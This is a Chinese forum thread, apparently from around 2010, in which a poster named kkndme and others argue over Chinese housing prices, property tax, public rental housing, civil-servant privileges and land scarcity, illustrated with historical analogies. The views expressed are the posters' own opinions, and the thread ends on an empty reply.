1978年越南入侵红色高棉，当时的红色高棉对内实行红色恐怖，以gongchanzhuyi的名义对全国700万人口进行奴役和屠杀，总共屠杀了100万人。当越南军入侵时，受到了广大柬埔寨群众的热烈欢迎，称越南军解放柬埔寨是解放人类的战争。 红色高棉失去了民心，必然败亡。 那时，为了支援红色高棉，中越战争打响。有我国的强力支持，红色高棉仍然走向败亡。 房产税的制定原则 中年不惑吗： 不过从政府要分租房市场的蛋糕而言，我有不同的看法 政府的公租房要想租出好价格，有两种方式 1）减少市场可出租房源（北京就这样干了，拆迁廉价城中村） 2）提高竞争房源的成本。（所以我认为推出房产税是大概率的事情，因为政府的公租房是不需要交房产税的） 于是竞争房源的房租暴涨，政府的公租房也就可以羞羞答答的打个9则来 安抚一些底层了，反正所有的黑锅都有竞争房源的房东背了 kkndme： 房产税的问题我觉得zf还是慎重的 1、如果采用不公平法则： 公务员，垄断企业，事业单位的福利房不上税，权贵与利益集团购买囤积的大量商品房不上税，只有普通百姓上税，会加剧社会矛盾，而房产税会大幅提升租金，在公租房没有大量建起来之前，对稳定不利，维稳才是第一要务。 2、如果实行公平法则 小产权房，福利房，权贵囤积房都要上税，执行难度太大，可操作性不强，阻力几乎难以逾越。 如果真的收房产税，采用不公平法则的可能性最大，普通的无房百姓生活将变得非常艰难。 维稳的本质是人民能吃饱饭 维稳问题其实最终还是吃饭问题。 房价上涨可以不买，如果房租价格不能控制，农产品价格不能控制。一旦大批群众吃饭出现了问题，维稳就无从谈起了。这个底线，还是要严守的 公租房是为体制内服务的 说到公租房问题 首先还是要提到我们实行的双轨制 从某一方面可以简单的理解为统治阶级内和统治阶级外。 也就是我们常说的体制内，体制外。 体制内：公务员、垄断企业及医院高校科研院所等事业单位。 体制外：外资、私企打工者，个体工商户，农民，这里面也应当包括高层的老板和最底层的长期无业人员。 我们感受最深的就是涨工资的问题，一旦政府涨工资，那就一定是体制内涨工资，跟体制外完全没有关系。在金融危机的08年，大批企业关门，减薪，裁员，美国欧洲因为钱紧不得不降低公务员薪水。而这时，我们神奇的国家在干一件事：公务员普遍加薪，是为了全国百姓着想—刺激消费。 还有保障房问题，这个也是我们感受最深的：保障房=公务员及垄断企业住房；解决住房问题变成了如何让领导干部住更多更大的房子，如何让体制内员工拥有足够舒适住房的问题。 体制外的群众，那是别想得到一点好处的。谁让你是被统治阶级呢。 公租房的推出，也要解决两个问题： 1、体制内的最下层（最下层也是统治阶级，也就是是古代官吏中的吏）员工的基本住房问题 2、向体制外被统治的小民稳定收钱的问题。 房产税一定会转嫁给租房人 中年不惑吗： 对公租房的问题受教了 不过当前从来不存在什么公平正义 税收向来是穷人多交，富人不交或少交 不过我很感兴趣的是假如推出了房产税 政府采取何种方式收 难道是如同鬼子进村了，挨家挨户的收？ 但鬼子本身就是房产税的征收对象（不然也当不了鬼子） 他们自己都抵制，难道还指望他们向屁民收 遇到那种要钱没有，要命有一条的主 难道政府还开拖拉机来收？ 5年前就叫嚣对房租收个人所得税 到现在也没有个影了 操作性实在太差 房产税无论是持有环节征收，还是交易环节征收都是要向最终租房人转嫁的。 好比鸡饲料上涨没有可能鸡肉不涨价，但是养鸡的并没有赚更多钱。 巨大的税收消耗也决定了GDP必须快速增长 & 公务员越精减越多 降低百姓租房困难的唯一国际通行办法就是减税。但是减税，在我国是很难行的通的。一个高增长高通胀的国家，高昂的腐败成本和巨大的浪费将导致国家必须维持高税收才能维持运转，gdp保8实际上是必须的也是迫不得已的。维持正常的运转，维持庞大的消耗税收而不是创造税收的公务员队伍，没有gdp快速的增长怎么可能呢。 feiying： 这种看法很有道理，但保8毕竟会有个尽头，一旦走到头了那怎么去做呢 kkndme： 对于小富即安的我等小老百姓来说，希望此生不要见到这一天的到来。 对于流氓无产者来说，盼望着这一天的到来。届时新的英雄将从流氓无产者中产生。如同威武的 同志。 艾馨999： 我也觉得应精减公务员，也许减掉三分之二房价就见效了，呵呵。中国确实存在很多不应有的机构。 kkndme： 千万不能精减，越精减越多。 一般裁减公务员都是专门裁那些没背景，没关系，不会拍马屁，傻干活的。而留下的就是有背景有关系，会拍马而不干活的。 当傻干活的公务员被裁掉以后，剩下的不干活的公务员照样不干活。 于是政府发现没人干活了，人不够用了，再大批量招人，所以越精简人越多。 这就叫精减膨胀 特别是把熟悉业务的熟手减下来后，不得不招3个新手才能顶的住。等新手熟练了，人又富裕出来了。 精减膨胀这是不可更改的。 千万别精减，谁提出精减跟谁急，到时人民更没活路了。 跳坑的青蛙： 楼主关于精简膨胀的见解很精辟~ 很多事情看起来、听起来很美，也仅仅是看起来、听起来而已， 有丰富生活经验的人仔细思考一下、观察一下就不是那么回事了~ kkndme： 是啊，很多空空们扯着脖子呼喊这个政策那个政策，殊不知执行下来，最倒霉的还是自己。管老爷利用空空们鸡冻的心情趁机敛财，赚个盆满钵满。等空空们明白过来，也没办法了。 好比许多人最欢迎的费改税，结果税增加了，费却一点没见少。 调控的好处是让zf利益最大化&防范金融风险 骑自行车买别墅： 就说政府为什么要调控？ 难道就为了给你说的P民面子？？ 如果房价一直暴涨，不更符合食利阶层的利益？房价低价一起彪～ kkndme： 真不知道你仔细看了没有。我通篇也没下过调控是为了给P民面子的结论。 调控的根本原因还是zy在房地产的游戏中没有得到好处。调控是为了让zy的国家队参与进来，成为主体。 垄断可以控制价格，维持稳定 垄断的目的还在于能够控制价格，为了维稳，zy是不希望暴涨的，但也不希望不涨。 体制内的住房问题有国家保驾护航 回头还说公租房 在私企打过工的都知道，毫无归属感可言，老板脑袋一发热，随时让员工卷铺盖卷走人。那是要多没保障有多没保障。原因是社会关系，关键客户，都掌握在老板一个人手里，员工就是打个下手，一不爽了，就换人呗。 统治者可知道不能这么用人的。一个庞大的国家机器要想正常运转，必须得让手下的和自己的利益一致。如果自己吃肉，手下的连汤都没得喝，这个机器就转不动了。 因此，在房价高涨的时代，保障房才成为zy默认的公务员房、垄断企业房。 公租房首要解决的就是手下里面最底层人士的住房问题。 我认为针对于体制内来说，无论是公务员，事业单位，还是国有企业的初级员工，都可以通过所在单位申请公租房，公租房的租金会略低于市场，主要是单位一定会提供补贴。 体制外对公租房的申请就没有那么幸运了。 依靠但又不能完全依靠开发商建公租房 钱的问题，dfzf也想到了解决的办法。 在卖地时就要求开发商配套建设一定比例的经适房、廉租房或公租房。 然而，羊毛出在羊身上，开发商不可能做赔本的买卖。经适房好说，反正是卖个住户，大不了利润很低，顶多挣得少点。而廉租房和公租房就纯粹是只见投入不见产出的（开发商可没资金没耐心收租子）。廉租房和公租房的建设成本必须加到所建的商品房身上，这肯定会抬高房价。 关键是拿地成本逐年上涨，孝敬的资金也在逐年上涨，在加上多出来的廉租房和公租房建设成本，房价不可能无限抬高的。开发商也需要资金回笼周转。房价越高风险越大只是无论zf，开发商，炒房客和买房群众都有的共识。只是房价多高才是高，不同的人理解是不同的。 显然，把大量廉租房和公租房的建设寄托在开发商配套身上是完全行不通的，不仅不能解决住房问题，还让本来就高企的房价更加雪上加霜。 体制内的住房问题不难解决 体制内公务员、垄断企业和事业单位的员工住房问题是不难解决的，因为有zf行为的强制意志在里面。 1、df划拨土地，征集开发商建经适房、公租房 2、dfzf强制要求开发商建配套经适房、公租房，建设成本就转嫁给购买商品房的冤大头吧。 3、体制内单位自有土地，集资建房。 多管齐下，体制内人员的住房不难解决，甚至体制内人员每人住好房子大房子多套房子的问题都不难解决。处于金字塔的中上层，他们俯瞰着芸芸众生。 解决体制外的住房问题：国家垄断，细水长流收租 处于金字塔下层的体制外的广大群众怎么办？ 体制内员工的住房舒适性和投资获利是首要保证的，不然光让干活不给好处，怎么能让手下听话呢？ 体制外广大群众的住房问题也要解决，这关系到社会稳定。 能不能拿出一个办法，即解决了群众住房问题，又可以从群众手里长期获取收益？ 细水长流收租子的事情开发商做不了，但zf可以做。 公租房，如果解决了钱的问题，面向广大群众的公租房的推出，将会取得双赢的局面。 既然房地产开发最肥的肉留给了国家队，国家队也应该投身到公租房的建设中来。 国家队全面进场之前，大鱼小鱼虾米泥鳅，皆可得利。 不把小鱼虾米泥鳅赶出池塘，市场无法控制，风险无法控制，公租房建设也无从谈起。 二套房首付提高到50%，第三套房停止贷款，小开发商的清理整顿，民营企业在招拍挂中无论价高价低都无法取得土地，等等一系列重拳直击小鱼虾米。 土地将回到国家队手中，这个世界将变得清爽。 让时光倒流到80、90年代，我们的dfzf守着蕴藏着巨大财富的金矿、锡矿、铜矿却过着贫穷的日子。没有资金，矿山是没有办法变成财富的。于是招商引资，为了gdp,为了解决就业问题，出台了各种优惠政策，于是外商堂而皇之的走进来了。成为了这些矿山的主人。5年，7年或者10年，外商享受的免税期满的时候，外商卷着巨额财富走了，留下了一个个废弃的充满危险的大坑。这是血琳琳的教训，zf没有理由不吸取。外资、私企、小业主总有一天会让他们清场，尽管这一天晚来了十几年。 在土地日益稀缺的今天，房租难道不是可持续产出的金矿？让炒房客、投资客、民企开发商见鬼去吧。 kkndme： 在土地日益稀缺的今天，房租难道不是可持续产出的金矿？ 百无一用一书生： 如果人们宁愿住桥洞呢，如果人们决定离开呢，如果房租收入不断下降呢 kkndme： 宁愿住桥洞的早晚要当盲流处理的 逃离城市基本是一部分人被淘汰掉，选择，离开，而又有更多的人冲击去。 房租收入下降基本是做梦才会出现的事情，国家队的进场就是不让房租下降 普通人买得起「优质商品房」就尽早买把 懒兔爱散漫： 楼主的意思是今后体制外的人（除最高层)外，是无缘商品房，只能住公租房了？ kkndme： 如果你现在还买的起商品房，那你就尽早买吧 商品房和公租房的区别 中年不惑吗： 有个疑问 商品房和公租房相比，优势在什么地方？ 那些楼裂裂的商品房估计质量还不如公租房吧 楼主应该加一句，买质量好的商品房 kkndme： 商品房和公租房的区别实际就是土地性质的不同，一个是出让，一个是划拨 出让那必须是招拍挂，那必须是天价。 划拨就基本算是白给，收钱就是象征性的意思意思。 是商品房还是公租房，土地的性质说了算，dfzf说了算。跟房屋质量没有关系。 一套房子假设20000一平，房子的价值也就占30%，剩余的都是土地的价值 提议通过征普税调节贫富差距，不是傻，就是坏（制定政策的人不会让政策针对自己，那么政策都是谁制定的呢） 今天看到搜狐上一篇文章说道要通过征税来调节贫富差距，提出这个方案的人不知是无知还是故意，如果zf听了这种无耻参谋的建议，不知道多少老百姓会活的更惨。 假设出台又一个新税种，无乱它叫什么，我们暂定为财产税。既然有了新税种，就要定任务，那好了为了这个税种制定了年上缴多少多少的任务。 实操的时候，执行的工作人员发现一旦轮到权贵脑袋上的事就没办法执行，你执行，他先让你下课。 但是任务必须完成，那还是从普通老百姓身上打主意吧。于是政策就完全走样了，非但起不了劫富济贫的目的，反而加重了穷人的负担。 往近里说，个人所得税，挣的是谁的税？权贵没看见交，月薪3000块的工薪层可一个都跑不了。3000块月薪上缴的个人所得税你看着不多，可对于养孩子糊口的老百姓来说，哪怕10块钱都是重要的。他们可没有资本象月薪上万的小资一样动不动花500块钱泡个吧。 个人所得税是有任务的，工作人员必须完成任务，税别管是局级干部交的，还是连孩子幼儿园都上不起的穷光蛋交的，总之完成任务就是好样的。既然局长的税收不上来，就要从穷光蛋身上加倍收上来。 往远里说，王安石变法是怎么失败的，以史为鉴可以知得失。王安石的初衷难道不是好的吗，可结果怎么样呢？只有一个——民不聊生。 书生误国啊。 调控带来的影响 许多兄弟关心房价什么时候会涨 那么先看看这次调控后都出现了什么样的现象。 全国房产成交量大幅下降 一线城市房价略有下跌，但并不持续，到现在基本跌不动了 多数二三线城市房价不跌反涨，成交量逐渐回升 大多数二线以上城市租金持续上涨 农产品价格有上涨迹象，大蒜、姜等小品种农产品遭遇爆炒。 变化莫测的政策导致精英阶层出现移民潮 还有什么，欢迎大家补充 农产品的价格关系到影响稳定的吃饭问题 农产品价格的上涨是很值得警惕的。想买房子但嫌房子贵的都市白领对农产品的价格很不敏感，但是金字塔最底层的最大多数群众是很敏感的。领导们也很敏感。这牵扯到相当大比例人口的吃饭问题，稳定压倒一切。 农产品价格的抬头会导致物价全面上涨，但国家不会坐视不管且有能力管 农产品价格的抬头将会导致物价全面上涨，在不引起质变的前提下，房价作为商品也不例外。这个引起质变的前提是出现饥荒的极端情况，这样的几率在现在社会很少。尽管干旱和洪涝使农产品大幅度减产，但是农产品还可以进口，国家还有粮食储备，保证全国人民填饱肚子还是不存在问题的。 资金会在优质资产之间流动，而决定优质资产价格的是精英阶层的购买力 一线城市仍然沉默，国家队在积极运动。二三线城市的房价上涨的成交量的回升却给了市场一个明确的信号。这是资金运动的规律。国家队对一线城市的布局，迫使资金流向二三线城市。二三线城市相对（与一线城市相比）不高的价位给出了较大上升空间的预期。 全国富人买北京上海，全省富人买省会，房价的合理性已经不能用简单的本地平均收入来衡量。精英阶层的购买力才是关键。 资金流向规律决定了农产品和资产价格总有一个要涨，人为压制，一定会按下葫芦浮起瓢 明年物价进入持续上涨期是一个不容回避的问题。 在资金总量不变的前提下，巨量资金推动农产品价格上涨或者推动房价上涨是一个必须的选择。 今年zf用行政手段严厉打击蒜和绿豆价格的暴炒，基本上没有起到作用，资金有自己的运作规律，光靠拿张悟本出气也不能解决问题。 资金流向规律决定了洼地不会一直是洼地 二三线城市的房价的上涨使与一线城市的差价缩小，为一线城市的发力提供了动能。 无论你喜欢还是不喜欢，都不是以人的意志为转移的 大城市对近距离的小城市有虹吸效应 许多人心怀房价肯定会跌回2004年的美好愿望，刻舟求剑似的思维错过了一次次购房的机会。在患得患失中，在牛刀的号角声中，在任志强的大炮声中，迷失了自我。 任何事物都是有其规律性的。关键是否有一双慧眼能够穿透重重的迷雾。 假设你是个投资客，你非要去石家庄和长沙买房子，结果发现不怎么升值，怨天怨地： 石家庄作为一个二线省会怎么会不涨？长沙的房价怎么那么低？ 我们知道，北京的房子是全国有钱人买的，省会的房子是全省的有钱人买的。但是当省会城市距离一线大城市在6个小时高速以内，省里的有钱人的资金就会流向一线大城市，而不是省会。河北的富人一定会选择在北京投资房产，湖南的富人一定会选择广州深圳投资房产。 假设你是一个投资客，你去昆明旅行，发现昆明的房价甚至高过重庆，很不理解。你很疑惑昆明这么小的西部边陲城市投资价值在哪里？ 昆明是云南省内唯一的大城市，且相邻的二线以上城市离云南省都比较远。云南地州资源丰富，虽然穷人占的比例大，富人的数量却也不少。昆明南有滇池，北有长虫山，作为一个700万人口的城市，土地资源非常稀缺。所以贵，一定有贵的原因。便宜一定有便宜的道理。 决定房价的因素有很多，具体情况具体分析 zzz4697： 楼主针对南昌的房价做个分析吗？从刚公布的100个城市房子均价看，南昌5k每平左右，是高了还是低了？ kkndme： 对于不了解的城市不敢妄下断言。没到现场调查就没有发言权啊。 房价会不会涨还要看dfzf的规划。 比如广州拥有大量的城中村，其周边有较多的大城市，广州的房价就比北京和上海低。如果广州的城中村一旦大规模拆迁，房价将会大幅上涨。 比如南宁东盟贸易自由港的概念使南宁的房价涨幅惊人。 南昌的地理位置，zf规划，发展前景，江西富裕人口的多少，都是决定房价的因素 房价暴涨是相对于钱而言的，不是相对于实际购买力而言的 tjOOSAN： 。。。。。。暴涨之后。。。。。。 我们不就是第二个日本吗？ 供求关系？供求关系，现在是谁在决定？国家！ 国家的经济结构决定的。制造业的资金都进入房地产了。能不涨吗？普通人有几个可以够炒房资格的？ 日本 当初也是供求关系！~~ 供求关系的根本也不应脱离，国家的经济实力！！ 还暴涨？怎么涨？再涨都够去美国买房了！！ 你这不扯淡么 kkndme： 中国和日本最大的不同在于日本的货币是开放的，中国的不是，是不能自由兑换的。 暴涨是相对于钱而言的，不是相对于实际购买力而言的。 80年代工资200多块钱一个月的时候，是不能想象90年代末北京城区5000每平米的房价的。那时候万元户已经是富人的代表了。 90年代末工资1000块钱的时候是不能想象现在30000一平米的房价的。90年代的100万绝对是富裕群体。可现在连个中产都算不上。 货币的持续贬值你没有考虑 土地不稀缺，优质土地稀缺 tjOOSAN： 在反驳楼主一句！！ 在中国的土地，可不稀缺！~~ 只是没开发罢了！！~~ 中国与世界不同！ok？13亿人！！用十三亿的居住权作为市场竞争的资本。 那太可怕了！真的！！！如果可能，中国绝对可以产出世界第一贵的地价！ 为什么？这么多人需要房子。能不涨吗？ 呵呵！多少有点扯淡！！别再提供求关系了！~~ 供求根本是平衡的！！ kkndme： 中国有13亿人口，960万平方公里土地，土地一点不稀缺。 但假设你在北京西城上班，让你去塔特拉马干买房子，你愿意去吗？ 全国有点钱的都要在一线城市和省会城市买房子，所以才会稀缺。 大兴安岭有大量的土地，哪个有钱愿意跑去置业呢？ 集中发展大城市是导致优质土地稀缺的原因 中国经济发展不平衡，牺牲全国大多数城市和乡村，来保证北上广深及大部分省会城市的繁荣才是造成土地稀缺的愿意。 土地有的是，房子有的是，但好位置的土地和房子并不多。 一方面大量的小县城和乡镇、村庄人口锐减，因为缺乏谋生手段不得不背景离乡外出打工，另一方面超大型城市越来越拥挤，土地资源越来越稀缺。 这就是中国集中发展极少数标杆城市所造成的呀，也是因为如此，才造成了中国金子塔式的收入结构，贫富差距越来越悬殊。 为人民服务是说给人民听的 很多人很疑惑，贪官越来越多，根本不把老百姓的利益放在心里，这些贪官即使被曝光了，还能继续当官。这是为什么呢？ 首先理解一下老百姓，也就是民到底是什么？ 民就是牛养，古代的时候，官员管理百姓叫做牧。官员管理百姓就是替君主放牧，只要保证牛羊不逃跑，不骚乱，那么就是合格的官员。 秦始皇暴政，百姓揭竿而起，可是陈胜起事后基本视民众如草芥，项羽屠杀平民比始皇更残暴。 萧何是一个很贤德的人，对百姓很好，赢得了很高的名声。刘邦在广武山和项羽对峙，得知了萧何在关中深受百姓爱戴，就疑心萧何要造反。一个君主爱民如子是为了百姓的支持，江山永固，一个臣子对老百姓好是不是要造反呢？于是派人去调查萧何。 萧何是个聪明人，感觉到刘邦已经不信任他了。于是赶紧改变工作作风，开始霸占百姓的田产，上大街欺负漂亮的妇女同志，并且派自己的子女上前线给刘邦做人质。 刘邦看到了萧何的行为非常高兴，知道萧何不会造反就放心了。 百姓不是牛羊是什么？ 在红色高棉统治下的柬埔寨人，民连牛羊都不如呀。 波尔布特同志坚持gongchanzhuyi的按需分配，取消了货币。于是市场经济完全没有了。群众完全变成了按阶级分配了。 阶级只分为两种，波尔布特老板及其打手是绝对的统治阶级，其他人为被统治阶级，也可以称为奴隶阶级。统治阶级对奴隶阶级不爽可以直接拿ak47突突。柬全国700万人口被波老板突突死了100万，当然不光是突突，还有活埋。 以至于越南派了10万军队侵略柬埔寨，受到了柬埔寨人民的夹道欢迎，称为解放人类的战争。 公道自在人心 历史是一面镜子，不同的国情决定了采取同样的政策结果可能是南辕北辙 博古才能通今，不了解历史无法治理国家，不了解历史也无法对事务有一个清楚的认识。 我们的今天本来就是历史的延续，前人经验和智慧的总结，不是一句话就可以抹杀的。 因为秦以后漫长帝国时代的大一统，才会把中央集权延续到现在。 而西方封建时代延续到地理大发现，诸侯割据王国、公国、侯国林立为现代的西方提供了民主制度的可能。 在制度上完全的不可比性，使向国际接轨成为了笑话。 我们看到的结果就是，物价上涨与西方接轨，甚至堂而皇之的超过西方，体制外的工资则与非洲结果，也算是国际化了。 zf限制政策房的利润，那kfs就一定会偷工减料 mellyzhang： 大家听过那个西三旗的有名的限价房——旗胜家园吧~！外表看起来那么光鲜，地段也不是特别偏，紧邻城铁，当然是被人疯抢都抢不到的两限房呀~！还不是质量问题一大堆。 ZF安排的政策房也是要KFS建的，哪个KFS没肉吃还能保证把房子盖好？？！！所谓检测都TMD是虚的~。 kkndme： 这是肯定的，开发商都追求利润最大化。 zf建设两限房限制开发商利润，开发商必然偷工减料，zf都知道怎么回事，必须争一只眼闭一只眼，否则这个政策就执行不下去了 屁股决定脑袋，人民不知厉害关系选房子，zf选农产品 对于渴望拥有一套产权住房的都市小白领对希望房价狂降已经到了歇斯底里的程度，他们赞成农产品价格放开，让资金炒作农产品，而离开房地产市场。理由很简单，一套房子一涨就是几十万甚至上百万，而大米小麦，一斤就算涨到10块，也根本不能影响到自己的生活质量。 如果我国农产品价格是开放的，资金流向大米、小麦、猪肉，并且允许囤积，房地产一定会下跌的，这是毫无疑问的。 但是，我们看到的绝不是10块钱一斤的大米、小麦，而是500块钱、1000块钱一斤的大米、小麦。 我国将会出现大面积的饥荒，几千万甚至上亿的底层人士饿死街头，社会将出现大的动荡。 而产权房屋价格的上涨牺牲的主体只是体制外部分都市白领的利益，换来的不过是网络上没完没了的牢骚和咒骂。 巨量资金必须有地方去，如今面临的房地产和农产品之间的选择，你认为zf会怎么做？ 各个阶层的住房问题都安排的妥妥的 体制内中层、高层可以分到多套福利房，低层至少能够分到一套保障房，即使最不重要部门的底层员工，搞到由单位补贴的公租房是没有问题的。 体制外的高层、中层，以他们的资金实力买多套房子都是不成问题的。 农民，分配有宅基地。国家要稳定，首先就是要农民稳定，因此我国只有农民能够分到土地自己盖房子。 军人，会享受到比公务员更好的福利，让军人享受更高标准的福利待遇，国家有深刻的认识。 那么只有体制外的都市中下层群众才是高房价的受害者，可是这个群体的地位真的很微不足道。 顶层的岁月静好来自于底层的负重前行 这些既无稳定工作（低层都市白领失业的概率还是蛮大的）又无自己的房产的都市小白领是金子塔底层被压榨的对象，甚至远远不如交通便利地区的农民。 没有这个群体的存在，金字塔上层的权贵是无法享受舒适的生活的。 社会需要底层群体用巨大的付出和极少的收获为金字塔上层群体服务。 当然，在巨大的付出后，有少数人会从低层脱颖而出，爬到金子塔的中层、甚至上层。 这些少数人带给了底层群体奋斗的希望。 拥有一套属于自己产权的房子，就只有一套路：从金字塔的底层往上爬。这条路很艰辛，并且会越来越艰辛，但总有希望。 底层指的是体制外底薪白领 天地间间： 楼主有一点没说透彻，那就是白领的工资普遍较高，他们有能力买房子，但是受到几千年以来的小农经济思想的约束，他们普遍认为买房子不划算，占便宜心里普遍严重，别看他们外表光鲜，其实还都是一帮农民 kkndme： 我说的是买不起房的低收入小白领 高薪白领不买房的不多吧，都是网上吹的吧。 高薪白领一般还是有自住房的，只是有人不愿意投资房产。每个人想法不同而已。 资金终会流向具有稀缺性的资产 天地间间： 请问楼主所说的低薪白领一个月赚多少钱算底薪？ 就拿我说吧，我06年买的房子，当时月薪3000元，这在当时算不算低薪？ 但是我买房了，还是一个人买的，当然老爸赞助了点。每个月还完月供兜里就剩几十元，硬扛下来了。 目前年薪12万，我老婆年薪6万？这算不算高新？ 如果我当时没买房子，以我们2个人的收入当下也买的起，只不过生活负担重一些。 所以请楼主明示，什么是低薪？ kkndme： 兄弟，你所描述的是另外一个问题。先说说你所说的这个问题，再谈谈什么叫低薪 先说06年你月薪3000买房子的问题。 我们打一个比方： 假设80年代，咱们两个月薪都是100块。你喜欢清朝的瓷盘子，咬咬牙，一年用好不容易攒下的100块钱买了清朝瓷盘子。我喜欢缝纫机，用一年好不容易攒的钱买了一个缝纫机。 市场有价值发现功能。显然，80年代清代瓷盘子的价值没有得到发现。 进入90年代，随着社会的发展，社会财富的增加，钞票也大幅度增加。清代瓷盘子的市场价值发现出来了，瓷盘子价格开始大幅上涨，你的瓷盘子由100块涨到1000块。而我买的缝纫机已经淘汰了 瓷盘子具备投资品的一切属性，能够吸收社会的富裕资金，而缝纫机没有这个功能。我很眼红，我虽然买的起这个瓷盘子（因为90年代我的工资由100涨到了800），但是我觉得价格太高了，没有买。而你的瓷盘子在90年代为你挣了900元钱。 时光又到21世纪，社会资金越来越多，钞票越印越多，可瓷盘子在市场上越来越少（都被收藏了），于是瓷盘子涨到了1千万一个，我即使想买瓷盘子再也买不起了，而不是嫌价格高的问题。而你已经成为了千万富翁。那个瓷盘子也并没有因为1千万的价格实在太高而暴跌，相反价格仍以每年20%的速度增长。 06年你在房价价值发现的初期买了房子，就像90年代你用1000块买清代瓷盘子。 如果你的工资不变，或者变化不足够大，现在你将没不起房子，就像你在21世纪不可能买的起瓷盘子。 天地间间： 楼主啊，你有一个概念错误：清代的瓷盘子是收藏品是古董，其价值是由拥有瓷盘子的收藏家决定的，而房子是商品（我指的是商品房，不是公租房之类的保障房），其价值远没有古董增值速度快，所以说收藏品和商品是有区别的。 kkndme： 呵呵，商品房当然和清代磁盘是不同的，升值空间不同，投资对象也不同，但价值发现的道理是一样的。投资品的基本属性：稀缺性是共有的，当然稀缺的程度不同。 我所讲的是投资品的价值发现，而不是商品房=清代瓷盘 土地的稀缺决定了大多数人永远买不起想买的房子 天地间间： 此外，您还没有正面回答我什么是低薪 我今年30多岁，如果我刚毕业肯定是拿底薪的，往最坏了想，我毕业几年到今年混的不好，今年只赚3000元一个月，我就买不起房么？ 如果你觉得是，那么你错了，我仍然可以买的起，我会到比较偏远的地段去买房子，比如密云，延庆等买套小户型二手房，那里的房价我仍然可以支付月供，当然我还是要像老爸要点钱付首付的。 可是如果我不这么想，觉得去哪里不划算，在四环里买房子多好啊！那么我可能就买不起了，因为在四环里买房已经超出了我的能力 那么请问我买不起四环里的房子是房价的问题呢还是我的问题呢？是不是说我买不起四环里的房子就是我买不起房？ 综上所述，每个人都有自己的能力极限，不同能力的人去不同的地段买房子，一味的强求自己做能力不及的事情，反而还怨天尤人的，这就是小农意识。 kkndme： 如果我们买首套房，不是为了投资。我们买房总有个基本的要求： 有一个自己的家，并且上班相对方便 如果你在长城饭店上班，你跑去密云买个房子。首先你上班就成问题。 如果我月薪3000块，我甚至不能在密云买房子（因为也上万了），但我可以在山西的某个县城买套房子。问题是我买这套房子干什么？ 先天下之友： 请问楼主，在密云延庆买房子就不能去长城饭店上班吗？貌似密云延庆的城轨马上就要开通了，一个小时就可以到三元桥的，如果你仍然觉得不可能，那么我就很同情生活在东京纽约的白领了，他们买房子都在离工作单位50-100公里的地方，他们大部分人也靠城铁上下班的，所以说东京和纽约的白领生活在水深火热中啊 此外，密云和延庆的二手房子10000元一平？用不用我贴个卖房帖子啊？密云和延庆县城里的二手房子均价6000一平，一居室50平吧，总价 约30万，首付12万，月供1200元左右，这个对于月薪3000元的人来说是不成问题的，当然去密云延庆买别墅确实是10000元一平。 kkndme： 这种抬杠没什么意义，如果密云的轻轨修通了，1小时到三元桥，密云就由远郊区变为了近郊区，房价也不会维持现有水平，一定会水涨传高。 我没看过密云的规划，如果真有这个规划，且密云房子还没有大涨的时候，还时值得购买的。 密云的房价我倒真没去看过，不过以前有个住密云的同学说密云的新盘1万多了，老房子价格我并不知道。 我们只不过打的一个比方，假设密云到城里上班没有问题，普通小白领又买得起，那么不买的可以称为傻空。 但是确实有真正买不起的，连密云也买不起的，月收入3000，但要供养老人和孩子的，即使能在河北某个县城买，可是房子不能上班就完全没有意义了。 天地间间： 我的中心思想是：北京的白领普遍买的起房子，但是有一部分不买，其原因是想花最少的钱去获得最好的地段，最好的楼层，最好的朝向的房子，这是划算不划算的问题，不是买得起买不起的问题 当然有的人会说：买房了，得病了怎么办？失业了怎么办？一大堆怎么办！那么请问：既然你知道早晚要见马克思，为什么现在还活着啊？一刀了断了算了，呵呵 kkndme： 你说的这类人其实是因为贪婪和恐惧，幸运不会垂青即贪婪又恐惧的人。用天涯的语言来说：就是传说中的傻空 不同阶层的人对收入高低有不同的理解 再说说收入高低，不同城市，不同消费水平，对收入高低有着不同的理解。 我们举北京为例。 反映真实居住成本的是房屋租金，而不是房价。 在北京生活，一家三口的通常情况 一个位置能够满足上班条件的两居室租金大约3000元，小孩花费没有3000块是下不来的，再加上夫妻俩2000元的基本生活花费，也就是说8000月收入的家庭，刚好能达到收支平衡。 如果是体制外的都市白领，这个收入是很可怜的，因为还要考虑到失业问题，并且应付万一发生的意外支出。所以每月能有2000元的结余是必须的，那么10000元是在北京生活的基本水平。 而购买商品房所支付的金钱是要远高于租金成本的，因为你买的不是房屋居住权，而是房屋的产权，一定会出现溢价。 如果你现在的家庭收入能够再买得起一套房子，那么你的收入水平应该至少是小康，甚至达到中产 天地间间： 楼主，一对有工作经验的年轻的北京白领夫妻月收入只有8000元？这是怎么统计的？ 您的统计结果不准啊，我的结论是10000-12000元/月是北京标准的白领夫妻的月收入，那么这笔钱能不能买房子？ 能，能不能付首付？可能不能，首付款怎么来的？一部分是父母赞助的。 作为父母就要把自己的孩子扶上马，再送一程，这和啃老没关系 kkndme： 呵呵，这个也不好这么说，不同行业间的薪水差距实在太大了。 比如一个有6、7年职业学校的教师或者一个有5，6年电脑分销经验的产品经理（都是大学毕业），他们辛辛苦苦干一年多点的也就7、8万块。他们都不晓得招商银行随便一个客户经理轻轻松松年薪几十万。 同是大学毕业，同是5、6年工作经验，北京几十万年薪收入的人不少，但一个月只挣3、4000块的数量更庞大。 先天下之友： 楼主，我说的是北京白领夫妻的标准工资，什么是标准工资？就是这个城市的可提供工作岗位加权平均工资，也就是说，你在北京混，正常的情况下，北京的白领夫妻在成为这个公司的主力员工以后就可以拿到的工资，什么是主力？就是在你的单位里能够独立挑起一滩活。 此外，在北京的白领，月薪3000元在大多数公司都是起薪价，工作几年后工资翻一番的比例很大，我在北京混了很久了，我相信在北京的绝大多数老板是给员工出路的，楼主你说是么？ kkndme： 我倒是觉得平均工资真没有什么意义。 你在中石化工作，各种收入加一起一年低于20万的还真没有。 你做基金经理年薪低于100万的还真不好找。 你在电力系统，有点职务的，一年搞个上百万都是轻轻松松的。 你要是公务员有点级别，好的一年收入上千万，不好的一年收入也就十来万。 但你要是在某个私营或者股份公司做个人事，行政，一年弄好了也就几万块钱 你要是做销售，好的销售年薪几十万，上百万，不好的销售一年也就挣2、3万。 我真不知道平均工资意义在哪里？ 一个年收入千万的总经理跟100个失业的白领平均，人人都是年收入10万 先天下之友： 我还是要强调白领的平均工资，这个很重要，也是很多北漂留下来的重要理由，不同行业收入不同，但是主流行业的收入差距是不大的，至于你说的中石油和其他的高薪公司这个一般人进的去么？ 至于失业问题，这个和国家的政策密切相关，属于不可抗力，一味的强调这一点没意思 kkndme： 